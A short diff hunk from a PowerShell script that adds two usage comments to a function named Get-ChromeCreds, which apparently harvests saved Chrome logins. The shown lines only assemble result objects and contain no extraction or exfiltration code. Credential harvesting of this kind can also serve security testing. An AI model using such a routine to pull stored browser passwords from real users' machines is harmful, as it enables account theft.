@@ -59,6 +59,8 @@ function Get-ChromeCreds() {
 	}
 
 	# Now create an object to store the previously created arrays
+	# I wasn't able to split up the URL/Username, but should be pretty easy to distinguish
+	# To view the entire User/URL field, use Get-ChromeCreds | Select-Object -ExpandProperty "UserURL"
 	$ArrayFinal = New-Object -TypeName System.Collections.ArrayList
 	for ($i = 0; $i -lt $UserNum; $i++) {
 		$ObjectProp = @{
